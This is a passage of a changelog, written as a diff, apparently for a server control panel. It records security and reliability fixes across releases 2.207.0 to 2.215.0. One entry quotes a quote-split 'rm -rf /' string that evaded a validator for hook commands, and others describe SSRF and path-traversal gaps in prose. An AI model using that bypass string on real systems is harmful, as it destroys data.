+directory as if each were a site's own backup folder — live-reproduced on this box as ~9x the real file
+count and ~50000x the real size. Fixed: the walk now excludes every known non-site subsystem root and
+any dotfile/dotdir.
+
+**`dockpanel apply` silently dropped an exported file's firewall rules.** `cmd_export`'s own output
+includes a `firewall` section, but `cmd_apply` never read it at all — no create, no warning, nothing. An
+operator editing firewall rules in the file and re-applying got total silent no-op. Fixed: `apply` now
+warns when the file names firewall rules, naming `dockpanel security firewall` as the actual way to
+manage them (full reconciliation is out of scope here — this is honesty, not a new feature).
+
+**`dockpanel apply` silently no-op'd `ssl: true` when no `--email` was given** — the site-creation line
+still printed a bare success tick as if SSL had been handled. Fixed: prints a warning naming what to
+re-run with.
+
+**`dockpanel apply --dry-run` always reported every cron job as "to create,"** even when byte-identical
+to what's already scheduled — the one resource type that DOES reconcile on a real apply (`/crons/sync`
+replaces every id it's given), so the dry-run plan was actively wrong, not just incomplete. Fixed: the
+dry-run plan now diffs against `/iac/export`'s own current-state cron list, same source every other
+resource type in the function already uses.
+
+**`db.rs`'s `rand_byte()` silently returned `0` if `/dev/urandom` was ever unreadable**, with no error
+surfaced — every one of the 16 bytes in an auto-generated database password would then come back `0`,
+producing the fully predictable `"aaaaaaaaaaaaaaaa"` printed to the operator as if it were a real
+generated secret. Fixed: `rand_byte()` now returns a `Result` and `iac.rs`'s password generator reports
+the failure instead of silently proceeding.
+
+**Off-menu (completeness critic): `panel/agent/src/services/remote_backup.rs`'s `run_sftp()` had no
+`kill_on_drop(true)`.** Its sibling `s3_curl()`, ~280 lines earlier in the same file, already carries
+this exact fix (v2.204.0) — a timed-out (dropped) future otherwise leaves `sftp`/`sshpass` running
+detached against the remote host. `run_sftp` backs every SFTP-destination backup upload (600s timeout)
+and the "Test Connection" button (20s) — was simply never in that commit's scope. Same fix as the 20+
+other call sites this pattern has been closed at across the crate since v2.203.0.
+
+Also corrected `docs/cli-reference.md`'s `apply` example, which showed a fabricated `[~] Update site:
+... (proxy_port 3000 → 3001)` line — a diff/reconcile capability that has never existed in the code
+(found independently by the skeptic, not the finder) — with real output and a note on what `apply`
+actually does and does not reconcile.
+
+New pin suite `tests/cli-io-crate-audit-pin-e2e.sh`, 19 assertions, mutation-tested via `git stash`:
+18/18 red pre-fix (1 unaffected positive control stayed green).
+
+## [2.215.0]
+
+### Fixed — `panel/cli` read four JSON field names the agent never emits, silently printing wrong or blank output
+
+Fresh audit rotation. The `panel/agent/src/{routes,services}` pool (79 files) is now exhausted of
+substantive never-primaried candidates — every remaining file carries real prior scrutiny, confirmed
+via a fresh two-direction pre-selection check this session. Pivoted to `panel/cli/src`, the gate's own
+named-but-never-fully-checked candidate pool: a `dockpanel-fanout` against the command files that had
+never had a dedicated finder/skeptic pass (`main.rs`, `apps.rs`, `status.rs`, `sites.rs`, `security.rs`,
+`client.rs`, `ssl.rs`, `php.rs`, `logs.rs`).
+
+**`dockpanel security`, `security firewall`, and `security scan` all read field names the agent's
+structs never had.** Every read resolved to `unwrap_or(default)`, so the bug was silent — no error, no
+panic, just "unknown"/"disabled"/blank output on a box where firewalld and fail2ban were genuinely
+active. `firewall_status`/`fail2ban_status` (strings) should have been `firewall_active`/
+`fail2ban_running` (bools); `ssl_coverage`/`scan_date` were read from fields `SecurityOverview` never
+had at all; the firewall list read `enabled` (real field: `active`) and `port`/`proto` on each rule
+(`FirewallRule` has only `number, to, action, from` — action is literally `"ALLOW IN"`/`"DENY IN"`,
+never bare `"allow"`); the scan command read a `risk_level` that doesn't exist on `ScanResult` and each
+finding's `message` (`Finding` has `title`/`description`, no `message`). Fixed: every read renamed to
+the agent's actual field names (cross-checked directly against the struct definitions), `risk_level`
+now derived client-side from the findings actually returned (using the real `critical`/`warning`/`info`
+severity vocabulary, not the fictional `low`/`medium`/`high` the old color-matching assumed), and the
+two dead SSL/scan-date lines replaced with `ssh_root_login`/`ssh_password_auth` — real fields the
+struct already carries for exactly this purpose. Read-only display paths only; the mutating
+`firewall add`/`remove` commands were already correct and untouched.
+
+**Off-menu, completeness-critic-found: `dockpanel backup list <domain>` always printed CREATED as
+`-`.** `commands/backup.rs`'s `cmd_backup_list` read `b["created"]`; the agent's `BackupInfo` struct has
+`created_at`, never `created` — and the same file's two sibling functions (`cmd_db_backup_list`,
+`cmd_vol_backup_list`) already read `created_at` correctly, so this was the one call site that never
+matched. `--output json` was unaffected (raw passthrough).
+
+New pin suite `tests/cli-field-mismatch-pin-e2e.sh`, 21 assertions (including 2 positive controls on
+the already-correct sibling functions), mutation-tested via `git stash`: 18/18 arms correctly red
+against pre-fix code, 3 controls stayed green.
+
+## [2.214.0]
+
+### Fixed — System Updates was apt-only and silently reported "0 updates" on RHEL, `from_name` never reached real mail, and a `msmtp.log`-wiping save
+
+Fresh audit rotation, LOC-ranked, against `services/smtp.rs` + `routes/smtp.rs` and `routes/updates.rs`
+— both genuinely thin/never-audited, confirmed via the two-direction pre-selection check before
+picking.
+
+**The whole System Updates feature (list/count/apply) was 100% hardcoded to `apt`/`apt-get`, with
+zero use of this project's own `pkg.rs` dual-family abstraction.** On an RHEL-family agent — a
+platform this project explicitly supports and tests elsewhere — `list_updates`/`update_count` got
+`ErrorKind::NotFound` from the missing `apt` binary and silently reported "0 updates," reading as
+fully patched. Fixed: `dnf`/`yum check-update` support, with its non-boolean exit status (0 = no
+updates, 100 = updates listed, anything else = a real error) handled explicitly rather than
+collapsed into a plain success/failure; a 3-token line parser that requires the `name.arch` dot
+(a mutation test this session caught a false positive without it); an `rpm -qa` lookup for the
+current-version column; and a `needs-restarting -r` fallback for `reboot_required` (RHEL has no
+`/var/run/reboot-required`). `apply_updates` now selects `apt-get`/`dnf`/`yum` via `pkg::installer()`
+instead of a hardcoded binary.
+
+**`smtp.rs::configure()`'s `from_name` was validated for injection and pushed fleet-wide by the
+backend, but never written into the msmtp config or the PHP `sendmail_path` ini** — the "From Name"
+field the UI promises applies "to all sites on this server" had no effect on any real application
+mail, only the one-off admin Test Email. Fixed: msmtp's `from_full_name` directive (verified against
+`man msmtp` — the `from` command is envelope-address-only; `from_full_name` is the separate directive
+that names the display name msmtp adds to an auto-generated `From:` header).
+
+**Every SMTP settings save unconditionally truncated `/var/log/msmtp.log`.** The frontend always
+re-PUTs all 7 `smtp_*` keys on Save — even an unrelated field edit — which the backend then pushes to
+every online fleet member, wiping the real mail relay log on every save, including the save an
+operator makes while debugging a mail problem using that exact log. Fixed: only create the file when
+it does not already exist.
+
+**Off-menu, completeness-critic-found: `routes/php.rs` carried the same orphaned-transient-unit bug
+v2.213.0 (the immediately prior release) had just fixed in `pkg.rs`.** Wrapping
+`safe_command_unsandboxed(...).output()` in a caller-side `tokio::time::timeout` only kills the
+local `systemd-run` waiter on expiry — the privileged `apt`/`dnf` transaction keeps running,
+orphaned, in its own transient unit. Three live sites (`install_version`, `uninstall_version`'s purge,
+its `apt autoremove` follow-up), all sharing `pkg.rs`'s own 300s `INSTALL_TIMEOUT` value. Fixed:
+converted to `UnsandboxedCommand::output_with_timeout()`, which also stops the named transient unit
+on timeout.
+
+## [2.213.0]
+
+### Fixed — 4 more `kill_on_drop` gaps in `pkg.rs`, a systemd-run timeout that never actually stopped the privileged work (carried 9 sessions), and a duplicate site-clone implementation
+
+This session bundled a set of small carries deliberately deferred across three prior sessions in
+favor of fresh audit rotation — including `pkg.rs`'s own `systemd-run` timeout fix, the single
+longest-carried item in this project's tech-debt ledger.
+
+**`pkg.rs` had 4 sites wrapping the sandboxed `safe_command(...)` builder in a `tokio::time::timeout`
+with no `kill_on_drop(true)`** — the established timeout-orphan class this project has now fixed 9
+times elsewhere, never swept in these specific call sites (`installed_php_version`, `php_streams`,
+`run_ok`, `which`). Fixed: `kill_on_drop(true)` added to each.
+
+**The harder, 9-session-carried fix: `safe_command_unsandboxed()`'s `systemd-run --wait` timeout
+only ever killed the LOCAL waiting client — the remote transient unit it started kept running,
+fully decoupled, until it finished on its own** (live-proven in a prior session: killing the local
+`systemd-run` PID left the transient unit `active (running)` indefinitely). Fixed: a new
+`UnsandboxedCommand::output_with_timeout()` in `safe_cmd.rs` assigns the transient unit a
+caller-known name via `--unit=NAME` (composes fine with `--collect`, which only means "discard
+state on exit" and says nothing about naming), and on timeout fires a best-effort, detached
+`systemctl stop --no-block <unit>` before returning an operator-actionable error naming the unit.
+All 6 of `pkg.rs`'s `safe_command_unsandboxed(...)` call sites now route through it. The
+live-log-streaming path (`spawn_streaming()`) has different completion semantics and was
+deliberately left untouched.
+
+**`routes/nginx.rs::clone_site` reimplemented, inline, the exact same rsync+chown-split logic as
+`services/staging.rs::clone_files`** — a second, independent implementation of the same
+"clone a site's files" feature, carried as known duplication since s456. Fixed: `clone_site` now
+delegates the copy+chown work to `clone_files`, keeping only its own size computation and response
+shape as route-specific code. External behavior (status codes, JSON shape) is unchanged.
+
+**`install-agent.sh`'s firewall-port-opening step checked `command -v ufw` before checking
+firewalld's actual active state** — the inverse of the check order `setup.sh`'s own
+`detect_firewall()` already uses, and the same split-brain class (s265) this project has fixed
+everywhere else: a box with `ufw` merely installed but `firewalld` actually enforcing would
+silently configure the firewall nobody is using. Fixed: check `firewall-cmd --state` first.
+
+**Also reviewed and resized, not fixed this session** (both required a decision this project's own
+gates call for before rushing a fix or a code change):
+- The `dockpanel-db-{name}` per-site container-naming gap was re-investigated and found much larger
+  than previously recorded — the deterministic name is independently reconstructed at 14+ call
+  sites across both the backend and agent crates, not a single-file fix. Resized in the tech-debt
+  ledger; needs its own dedicated session.
+- The CLI's inability to restore a DB-carrying backup was investigated to a complete, actionable
+  design (a `dp_`-prefixed API-key extension to the backend's existing `AuthUser`, reusing an
+  already-built-but-unwired `api_keys` scaffold) but deliberately not implemented — it adds a new
+  credential surface and was scoped for a future session rather than rushed.
+- The topological per-tenant DB-networks deferral (s243, rejected on operational-cost grounds) was
+  re-verified still fully unbuilt and the tradeoff unchanged — re-affirmed, not revisited.
+
+## [2.212.0]
+
+### Fixed — CMS one-click installers had no timeout on any spawn, two frameworks silently mangled certain passwords, and neither downloaded artifact was integrity-checked
+
+From this session's `dockpanel-fanout` audit of `services/cms.rs` + `routes/cms.rs` — a genuine
+LOC-ranked rotation pick (never previously a PRIMARY fan-out target), reached only after 32 other
+candidates across `panel/agent/src/{routes,services}` were checked and disqualified by the
+two-direction pre-selection check (in-file citation grep + memory-mention grep), the most
+thorough pre-selection pass run to date.
+
+**`run_cmd`/`run_cmd_in` — the shared helper all 5 CMS installers (Laravel, Drupal, Joomla,
+Symfony, CodeIgniter) route every `composer`/`drush`/`php`/`curl`/`unzip` call through — had zero
+`kill_on_drop` and zero `tokio::time::timeout` anywhere.** The established timeout-orphan class
+this project has now fixed 9 times (`docker_apps.rs`, `pkg.rs` — see below, `database_backup.rs`,
+`wp_vulnerability.rs`, `backups.rs`, `security.rs`, `database.rs`, `image_scanner.rs`,
+`sbom_scanner.rs`), never swept in this file. A stalled network fetch or a DB that never comes up
+could hang an install request indefinitely; a cancelled/timed-out child would run unattended
+rather than dying with it. Fixed on both helpers, `ensure_composer()`'s own curl call, and
+`install_joomla()`'s tag-resolution/download/unzip calls, with per-operation-appropriate bounds
+(300s for `composer`, 180s for a DB-writing CLI installer, 120s for a package download, 60s for a
+quick metadata fetch or `php artisan` call).
+
+**Off-menu, found by the setup critic while it was checking this session's own citations**:
+`services/pkg.rs::enable_php_stream` was miscited by both the finder and the skeptic as an
+*already-fixed* precedent for the item above — it actually has a `tokio::time::timeout` with
+**zero** `kill_on_drop` anywhere in the file. The reason is structural, not an oversight at the
+call site: it spawns via `safe_command_unsandboxed()`, whose `UnsandboxedCommand` builds its own
+inner `tokio::process::Command` for `systemd-run` internally — no caller can reach that `Command`
+to chain `.kill_on_drop(true)` onto it. Fixed at the source, in `safe_cmd.rs` itself, which
+closes the gap for every one of the ~48 `safe_command_unsandboxed` call sites across 8 files as a
+consequence of fixing the one place that could actually fix it, not just `pkg.rs`.
+
+**Laravel's `.env` writer quoted a value only if it contained a space — never for `#`.**
+`vlucas/phpdotenv` (Laravel's bundled parser) treats a bare `#` as an unconditional comment-start
+in its unquoted-value state, with no whitespace precondition: a password like `Tr0ub#dor` (no
+space, so never quoted, and it passed this project's own validation) was written as
+`DB_PASSWORD=Tr0ub` — silently truncated, install reports success, the real DB password is wrong.
+Fixed: unconditional double-quoting with `\`, `"`, and `$` all escaped (a bare `$` inside
+phpdotenv's double-quoted state starts variable interpolation unless escaped) — verified against
+the real library, round-tripping `#`, space, `"`, `'`, `\`, `$`, and all of them combined in one
+value in a scratch Composer project.
+
+**CodeIgniter's `.env` writer never quoted anything.** CI4 rolls its own dotenv parser (not
+phpdotenv), whose `sanitizeValue()` throws an uncaught `InvalidArgumentException` for any
+unquoted value containing whitespace — and that fires in `Boot::bootWeb()` *before* CI4 installs
+its own exception handler, so it's a raw fatal on every request, not a graceful 500. Fixed with
+the same unconditional double-quoting, but a **different** escape set than Laravel's: `\` and `"`
+only, deliberately leaving `$` un-escaped, because CI4's own unquoting regex recognizes only
+those two backslash sequences — a `\$` would desync that regex rather than produce a literal `$`.
+Verified against CI4's actual parser source. **One residual limitation, CI4's own and not fixable
+from this side**: `resolveNestedVariables()` runs after unquoting and substitutes any literal
+`${SOME_SET_ENV_VAR}` substring against the process environment, with no escape mechanism CI4
+provides at all. Given `safe_command`'s child environment is a fixed, minimal set (`PATH`,
+`HOME`, `LANG`, `LC_ALL`, `DOCKER_CONFIG` — nothing password-shaped), this is a theoretical
+residual, not a practical one, but it is documented in the code rather than silently left out.
+
+**`ensure_composer()` downloaded `composer.phar` via a bare `curl` with zero integrity check**
+before making it executable and using it as the install engine for 4 of 5 CMS installers. Fixed:
+fetches the `.sha256` sidecar `getcomposer.org` itself publishes at the same path, verifies
+before `chmod +x` — fails closed (removes the phar) on any mismatch or fetch failure.
+
+**`install_joomla()` downloaded the release zip via a bare `curl` with zero integrity check.**
+Unlike `composer.phar`, GitHub does not publish a discrete checksum file for release assets —
+Joomla instead documents a per-package SHA-256 table inside the release notes' free-text body
+(confirmed stable in format across the 8 most recent releases sampled, including betas/RCs).
+Fixed: switched tag-resolution from the old `curl -sI` HEAD-redirect trick to GitHub's Releases
+JSON API (one call now yields both the tag and the checksum table), extracts the hash tied to the
+exact filename about to be downloaded, verifies before `unzip` — fails closed on any parse,
+fetch, or mismatch failure. **Honest caveat**: this checksum lives in free-text release notes,
+not a versioned API field — if Joomla ever changes that table's format, this fails closed (no
+checksum found → install aborts with a clear error) rather than silently skipping verification,
+but it is not as durable a guarantee as a dedicated checksums file would be.
+
+**`install_drupal()`'s `db_url` (`mysql://{user}:{pass}@{host}/{db}`, passed to `drush` as one
+argv) validated `db_pass` only for newline/CR/null, and never validated `db_host` at all — unlike
+every other credential field.** Verified empirically against PHP's actual `parse_url()` (which
+Drupal's own connection-options code feeds this string through with no `urldecode()` anywhere on
+the path) that `/` and `?` break parsing outright, and `#` does too in the password — but in
+`db_host`, `#` doesn't fail, it silently **truncates the host into a URL fragment**, worse than a
+clean error. **Percent-encoding was considered and rejected**: the same Drupal code path never
+decodes escapes, so an encoded `#`/`/` would reach the database driver as a literal `%23`/`%2F`
+instead of round-tripping to the real credential — confirmed by reading Drupal's actual source,
+not assumed. Fixed instead by rejecting `#`, `/`, `?` in `db_pass` (added to the existing
+denylist) and adding new allowlist validation for `db_host` (previously unvalidated).
+
+**Confirmed correct, not a bug**: Joomla's install CLI receives both `--admin-user=` and
+`--admin-username=` with the same value, which reads like a duplicate flag pair. Pulled Joomla's
+actual install form definition and CLI command builder — they are two genuinely distinct,
+both-required fields (display name vs. login name), and this project's API only exposes one of
+them to fill both. No change made.
+
+**Deferred, not this session's to fix — same as the prior session's ledger, not new**: the
+SSRF-via-registry-host primitive in `image_scanner.rs`/`sbom_scanner.rs` the completeness critic
+re-surfaced while scanning the wider agent crate for anything comparably severe. Still needs a
+private-registry-allowlist design, not a denylist; unchanged by this release.
+
+New pin suite: `tests/cms-installer-hardening-pin-e2e.sh`, 32 assertions, mutation-tested via a
+targeted `git stash` of the 3 touched source files (`services/cms.rs`, `routes/cms.rs`,
+`safe_cmd.rs`) — 26 of 32 correctly went red against the pre-fix code on the first pass; the
+remaining 6 included 2 genuinely vacuous passes (functions that don't exist at all pre-fix
+trivially satisfy an absence check) and one assertion caught as too weak by this session's own
+mutation test (it checked `db_host` was *referenced* in the validation body, which was already
+true pre-fix via the unrelated per-CMS extraction code — tightened to check the actual validator
+call, then reconfirmed red pre-fix / green post-fix).
+
+## [2.211.0]
+
+### Fixed — image/SBOM scanner installers trusted a moving target; a timed-out scan could outlive its own timeout; fresh CMS installs left DB credentials world-readable
+
+From the s457 `dockpanel-fanout` audit of `services/image_scanner.rs` + `routes/image_scan.rs` —
+a route/service pair never previously the PRIMARY target of a fan-out, picked via LOC-ranking
+over the remaining unaudited `panel/agent/src/{routes,services}` files.
+
+**`install_grype()` and `install_syft()` fetched Anchore's `install.sh` from the mutable `main`
+branch ref and let it resolve "latest" at install time** — no tag pinned, so a run today and a
+run next month could silently install different binaries. Anchore's own `install.sh` already
+sha256-verifies the downloaded archive against its published `checksums.txt` unconditionally
+(confirmed by reading the script directly, not assumed), so this was a reproducibility gap, not
+a missing-integrity-check one. Fixed by pinning both the script fetch and the installed release
+to a specific version tag (`GRYPE_VERSION`/`SYFT_VERSION`) via `install.sh`'s own documented
+`TAG` argument.
+
+**Neither scanner's process spawns set `kill_on_drop`** — a grype/syft child that outlives its
+180s timeout keeps running after the caller is told it "timed out," the same orphan class this
+project has already fixed in `docker_apps.rs`, `pkg.rs`, `database_backup.rs`,
+`wp_vulnerability.rs`, and `backups.rs` (s446–453); these two files were never swept in that
+arc. Fixed on all 5 spawn sites across both files.
+
+**Off-menu, found by the completeness critic**: `wordpress.rs::install` and 4 of `cms.rs`'s 5
+CMS installers (Laravel, Drupal, Joomla, CodeIgniter — Symfony's install path takes no DB
+credentials at all) wrote a DB-credential-bearing file (`wp-config.php` / `.env` /
+`settings.php` / `configuration.php`) at the process umask's default 644, with no `chmod`
+anywhere on the install path. `wp_vulnerability.rs` already had a "wp-config-perms" hardening
+check for exactly this (`chmod 640`) but it only ran via the separate opt-in
+`POST /wordpress/{domain}/harden` pass, never on install itself. **Honest scope, live-verified
+on this box before shipping**: tightening permissions closes reads from any *other* local OS
+account. It does not, and structurally cannot, isolate one tenant's own www-data-identity
+PHP-FPM pool or client-role shell from another tenant's credential file — every site's pool
+currently shares the identical `www-data:www-data` identity (confirmed: a 600-mode file owned
+by `www-data` is still readable by a process running as `www-data`; only a genuinely different
+user was denied). That deeper isolation gap is the separate, already-tracked per-site-OS-user
+architecture question — unchanged by this fix.
+
+**Deferred, not fixed this session**: `scan_image()`/`generate_sbom()` accept an
+attacker-shaped `host:port` image reference with no registry allowlist — grype/syft make their
+own outbound HTTPS connection independent of any local Docker daemon, a live-verified
+connectivity-probing SSRF primitive (reachable only by an admin-role, per-server-scoped backend
+caller). A naive RFC1918/loopback denylist would break a legitimate self-hosted
+private-registry use case, so this needs an explicit allowlist design rather than a rushed fix.
+
+New pin suite: `tests/scanner-supply-chain-and-credential-perms-pin-e2e.sh`, 20 assertions,
+mutation-tested via a targeted `git stash` of just the 4 touched files (18/20 correctly red
+against pre-fix code, 2 positive controls — Symfony correctly left unwired, WordPress's
+pre-existing `chown` untouched — correctly stayed green).
+
+## [2.210.0]
+
+### Fixed — six sites could hand a git-deployed site's `.git` to www-data on clone/sync/import; the flagship backup-restore path left every restored site root-owned and unwritable
+
+From the s456 `dockpanel-fanout` audit of the `.git`-blind recursive chown bug class — a
+standing carry since s377, escalated to "recommend its own dedicated dockpanel-fanout rep" in
+this project's own tech-debt ledger and left unaddressed across five more sessions until this
+one closed it directly.
+
+**Six call sites recursively `chown -R www-data:www-data`'d a directory that can be a Git Deploy
+site root without excluding `.git`**, handing the web application (running as www-data,
+attacker-influenced) write access to `.git/config` and `.git/hooks/` — the exact defect
+`deploy.rs::hand_tree_to_web_user` and `routes/backups.rs::chown_restored_tree` (s453) were
+already fixed to avoid, now ported to the remaining sites: `app_process.rs::create_app_service`,
+`staging.rs::clone_files`/`sync_files`, `nginx.rs::clone_site`, `migration.rs::import_site_files`,
+and `cms.rs`'s shared `chown_site` helper (covers all 5 CMS installers — Laravel, Drupal, Joomla,
+Symfony, CodeIgniter). Currently PROSPECTIVE rather than realized: the only code that runs `git`
+as root against a `/var/www` path (`deploy.rs::clone_or_pull`) already carries independent
+`GIT_NO_EXEC` + `discard_repo_we_do_not_own` protections, so this closes a violation of the
+project's own stated invariant and a fragile, coincidental mitigation gap — not an open RCE on
+this box today. Three originally-flagged sites (two nginx fastcgi-cache-dir chowns, one
+single-file `.env` chown) and one more (`diagnostics.rs`'s create-root self-heal, which only ever
+runs against a directory it just created empty) were re-verified structurally unable to reach
+`.git` and correctly left unchanged.
+
+**The primary, documented "Restore a Backup" feature left every restored site `root:root`-owned
+and unwritable by the app** — found by the completeness critic, off the original topic menu.
+`services/backups.rs::restore_inner`'s tar extraction runs `--no-same-owner
+--no-same-permissions`, and no chown call existed anywhere on that path; the git-aware
+`chown_restored_tree` helper already lived in the same file but was wired only to the separate,
+opt-in Restic restore lane. Every ordinary site owner who backed up and restored a site through
+the base Backups page — no git-deploy, no special config — hit a site the web server could no
+longer write to. Fixed by calling the existing helper from `routes/backups.rs::restore` and
+`::restore_file` after a successful restore, mirroring its pre-existing `restic_restore` caller.
+
+31 new pin assertions (`tests/git-blind-chown-and-restore-ownership-pin-e2e.sh`, new file,
+mutation-tested via whole-tree `git stash` — 20/31 correctly failed against pre-fix code, 11
+correctly stayed green as positive controls on untouched invariants).
+
+## [2.209.0]
+
+### Fixed — database-container network reconcile could silently orphan unrelated tenants' databases; a non-admin site owner could OOM-kill the shared agent with one file download
+
+From the s455 `dockpanel-fanout` audit of `panel/agent/src/services/database.rs` +
+`panel/agent/src/routes/database.rs` — the direct follow-up on this project's own s297 UNBUILT
+flag ("database.rs never audited"), which s454's fan-out had just found was invisible to the
+rotation's own selection bookkeeping.
+
+**`reconcile_network_icc()` — the one-time migration that hardens the shared `dockpanel-db`
+bridge (disables inter-container communication) for installs whose network predates that
+default — aborted on the FIRST reconnect failure**, and by that point the network had already
+been torn down and recreated: every container later in the batch than the failure was left with
+**zero network attachment**, silently taking their published `127.0.0.1` port bindings offline —
+a live database outage for tenants who had nothing to do with whichever request triggered the
+reconcile, with no server-side record of which containers were left orphaned. Live-proven against
+a real, fully disposable Docker network (never the shared `dockpanel-db`): two real containers
+straddling a deliberately-unconnectable id both now end up reconnected, and the aggregated error
+names every container that actually failed. Prospective on this box today — no legacy
+(pre-hardening) `dockpanel-db` network currently exists — but real and deterministic in the code
+for any install that hasn't yet run this one-time reconcile.
+
+**`GET /files/{domain}/download` read an entire file into memory before sending a single response
+byte, with no size cap** — unlike its sibling `read_file` (the text-editor "open" path, capped at
+2MB in the very same file). Found by the completeness critic, who went outside the session's
+menu into `panel/agent/src/routes/files.rs` after confirming zero prior audit history there.
+The agent is the *one* process per box mediating deploys, backups, terminal sessions and Docker
+orchestration for every tenant, and runs under a 512MB `MemoryMax` cgroup; a site's own webroot
+routinely holds files well past any upload cap (database dumps, unrotated logs, media), with no
+per-site disk quota. An ordinary, non-admin site owner downloading a large-enough file already
+in their own webroot could OOM-kill the shared agent with one HTTP request — every other
+tenant's in-flight deploy, backup, or terminal session on that box would fail during the
+crash+restart window, and a repeated trigger could crash-loop the unit past its restart limit
+until an operator manually resets it. Fixed by streaming the response instead of buffering it —
+memory use becomes constant regardless of file size, so no arbitrary download cap is needed.
+
+11 new pin assertions (`tests/database-icc-reconcile-and-file-download-pin-e2e.sh`, new file,
+mutation-tested via whole-tree `git stash` — 10/11 correctly failed against pre-fix code, the
+11th a positive control on an untouched sibling function), plus a live Docker-backed regression
+test for the reconcile fix (creates two real disposable containers and a disposable network,
+never the real `dockpanel-db`).
+
+## [2.208.0]
+
+### Fixed — security surface: SSH `Include` drop-ins ignored (live wrong port reported), firewalld-only boxes 424 on firewall rule changes, RHEL auth-log blindness, and a shell quote-splitting bypass in git-deploy hook validation
+
+From the s454 `dockpanel-fanout` audit of `panel/agent/src/services/security.rs` +
+`panel/agent/src/routes/security.rs` (picked as this session's rotation target per
+[[feedback_dockpanel_audit_scope]]'s pre-selection check, after `compose.rs`,
+`diagnostics.rs`, `database.rs`, `migration.rs`, `command_filter.rs`, `ownership.rs`,
+`wordpress.rs`, `backup_drill.rs`/`backup_verify.rs` and `php.rs` were all disqualified
+by real prior-scrutiny history).
+
+**SSH config reading and writing only ever touched `/etc/ssh/sshd_config`, never
+following an `Include` directive into `/etc/ssh/sshd_config.d/*.conf`.** OpenSSH's own
+rule is "the first obtained value wins", and the stock `Include` line ships *before* the
+main file's own commented defaults — live-verified on this exact box: `GET
+/security/overview` reported `ssh_port: 22` while sshd was actually listening on 1571
+(set by a `port.conf` drop-in), and a `50-cloud-init.conf` drop-in silently overrode
+`PasswordAuthentication` the same way. Worse, a write through the old code path
+(`change_ssh_port`, `disable_ssh_password_auth`, etc.) would report success while sshd —
+governed by the drop-in — kept the old value, which for a port change is a real lockout
+risk. Fixed: `parse_ssh_config`/`modify_sshd_config` now linearize `sshd_config` and its
+`Include`d files into the order sshd itself evaluates them in, read the first match per
+keyword, and write to whichever file actually governs a key rather than always the main
+file.
+
+**`add_firewall_rule`/`remove_firewall_rule`/the "block port" one-click auto-fix shelled
+to `ufw` unconditionally**, even though `get_firewall_status`/`change_ssh_port` had
+already been fixed (s265) to detect firewalld. Live-verified 424/`UFW_MISSING` on this
+exact box (firewalld active, ufw not installed) — the RHEL family is a first-class
+`setup.sh` target, not an edge case. Fixed: both functions now detect the running
+firewall; firewalld gets new parity primitives (`firewall::add_port`/`remove_port`/
+`remove_service`/rich-rule add+remove) and rich rules are now listed alongside services
+and ports in one continuously-numbered view, so "delete rule N" resolves correctly
+however the rule was added.
+
+**`get_login_audit()` hardcoded `/var/log/auth.log` and silently turned a missing file
+into an empty, HTTP-200 result** — indistinguishable from a genuinely quiet host. RHEL
+logs the same sshd events to `/var/log/secure` instead. Two sibling hardcodes found in
+the same sweep and fixed alongside it: `diagnostics.rs`'s brute-force scan (its finding
+silently never fired on RHEL) and `routes/logs.rs`'s log-sizes listing (cosmetic). Fixed
+via a shared `resolve_auth_log_path()`, and a missing/unreadable log is now a real error
+the fleet-aware backend wrapper already knew how to report correctly.
+
+**Completeness critic, off the original menu: `is_safe_hook_command` — the validator
+gating git-deploy `post_deploy_cmd`/`pre_build_cmd` at the `sh -c` sink in
+`git_build.rs::run_hook` — was the one function in `command_filter.rs` never routed
+through `normalize_for_blocklist`.** Executed proof: `is_safe_hook_command("r'm' -rf
+/")` returned `true`, and `sh -c "r'm' -rf /"` runs `rm -rf /` for real — the exact
+quote-splitting evasion this file's three other validators were already fixed against.
+The backend's independent copy, `is_safe_shell_command` (`routes/mod.rs`), had no
+quote/backslash normalization at all and got the same fix. Reachable only by an
+already-admin session (both write paths require `require_admin`); prospective on this
+box today (zero git-deploy configs have a `post_deploy_cmd` set).
+
+## [2.207.0]
+
+### Fixed — site backup/restore: 9 more orphan-on-timeout subprocess sites, two defence-in-depth archive-parsing guards, a silent-failure Restic endpoint, and a `.git`-blind chown
+
+From the s453 `dockpanel-fanout` audit of `panel/agent/src/services/backups.rs` +
+`panel/agent/src/routes/backups.rs` (picked as this session's rotation target per
+[[feedback_dockpanel_audit_scope]]'s pre-selection check — zero in-file citations, and
+the file's only two prior memory touches were narrow single-bug sweeps, never a
+PRIMARY finder/skeptic pass).
+
+**9 of the file's 12 subprocess call sites wrapped a `tokio::time::timeout` around a
+`tar`/`restic` invocation without ever chaining `.kill_on_drop(true)`** — the same gap
+class fixed in the three immediately preceding releases, this time inside the file that
+already carried the ONE already-fixed reference site. Two of the nine (`restore_inner`'s
+main tar extraction and `restore_single_file`) write directly into a site's **live,
+publicly-served webroot**, so a timeout firing left an orphaned `tar` still writing
+there in the background after the caller had already been told the operation failed.
+Fixed: `.kill_on_drop(true)` added to all 9 sites — `extract_payload`, `restore_inner`,
+`list_backup_files`, `restore_single_file` in `services/backups.rs`, and every
+`safe_command("restic"/"which")` call in the Restic incremental-backup lane.
+
+**The Restic restore endpoint (`--target /`) had no structural confinement to the
+site's own webroot** — it relied on an unchecked runtime invariant instead of the
+structural guarantee the tar-based restore lane already gets for free from relative
+archive members. Fixed: `--include {site_dir}` added to the restore call. Unreachable
+in production today (restic isn't installed on this box and the shipped frontend never
+calls this lane), but cheap to close before it ever gets a UI.
+
+**Two archive-parsing guards, both defence-in-depth (no reachable attack path found —
+both require an attacker to already have direct filesystem write access to a site's
+backup directory, which exceeds what either bug alone would grant):**
+a hand-crafted archive whose top-level `.dockpanel-backup` payload member is itself a
+symlink was extracted and read through without complaint; `extract_payload` now refuses
+when that member resolves to a symlink instead of a real directory. A restored
+`manifest.json`'s `file` field (JSON inside the archive) was joined onto the dump
+staging directory with no validation — an absolute path there makes `PathBuf::join`
+discard the base entirely and point straight at an arbitrary root-readable file;
+`restore_inner` now rejects an empty, `/`-containing, `..`-containing, or absolute
+`file` value before it is ever joined.
+
+**`GET .../restic/snapshots` never checked the command's exit status**, unlike its two
+sibling Restic handlers — a wrong/rotated password or a locked/corrupted repo produced
+empty stdout, which `serde_json::from_slice` failed to parse, and `unwrap_or_default()`
+silently turned that into `{"snapshots": [], "total": 0}` with HTTP 200: indistinguishable
+from a site that genuinely has no backups yet. Fixed to check `output.status.success()`
+and surface `stderr`, mirroring the two siblings.
+
+**The post-restic-restore `chown -R www-data:www-data` handed the application `.git`
+if the site uses Git Deploy** — undoing `deploy.rs`'s own careful root-owned-`.git`
+invariant and reopening the exact hook-execution-as-root path that invariant exists to
